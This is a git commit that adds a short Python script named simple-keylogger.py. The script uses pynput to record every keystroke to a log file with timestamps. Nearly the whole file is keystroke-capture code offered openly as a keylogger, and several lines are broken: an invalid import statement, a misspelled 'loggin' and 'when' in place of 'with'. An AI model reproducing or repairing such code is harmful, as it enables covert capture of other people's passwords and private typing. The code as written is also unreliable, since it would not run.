f10cc9ba1b9df302bdefe6559108cb54e2b9e820
Enzo Frederico <101186119+Enzofmlg@users.noreply.github.com>
2023-11-06 17:13:51 -0300

    Add files via upload

---
+++ simple-keylogger.py
@@ -0,0 +1,12 @@
+import pynput
+import pynput.keyboard import Key, Listener
+import logging
+
+log_dir = r"C:/Path/To/Keylogger"
+loggin.basicConfig(filename = (log_dir + r"/keyLog.txt"), level=logging.DEBUG, format = '%(asctime)s: %(message)s')
+
+def on_press(key):
+    logging.info(str(key))
+
+when Listener (on_press=on_press) as listener:
+    listener.join()
